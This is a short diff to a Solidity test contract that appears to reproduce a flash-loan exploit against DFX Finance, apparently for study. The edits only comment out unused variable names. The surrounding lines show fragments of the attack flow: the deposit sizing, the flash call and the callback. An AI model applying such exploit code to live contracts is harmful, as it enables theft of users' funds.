@@ -58,7 +58,7 @@ contract Exploit_DFXFinance is TestHarness {
         logBalances(address(this));
 
         // Get the amount of USDC required for the attack.
-        (uint256 curvesInExchange, uint256[] memory amountPerToken) = dfx.viewDeposit(AMOUNT_TO_DEPOSIT);
+        (/* uint256 curvesInExchange */, uint256[] memory amountPerToken) = dfx.viewDeposit(AMOUNT_TO_DEPOSIT);
         uint256 amount0 = amountPerToken[0] * 994 / 1000; // From tx trace
         uint256 amount1 = amountPerToken[1] * 994 / 1000; // From tx trace
 
@@ -84,7 +84,7 @@ contract Exploit_DFXFinance is TestHarness {
         dfx.flash(address(this), amt0, amt1, new bytes(0));
     }
 
-    function flashCallback(uint256 _fee0, uint256 _fee1, bytes memory data) external {
+    function flashCallback(uint256 /* _fee0 */, uint256 /* _fee1 */, bytes memory /* data */) external {
         require(msg.sender == address(dfx), 'Only callable by DFX');
 
         console.log('------- STEP II: INSIDE DFX FLASHLOAN CALLBACK -------');  
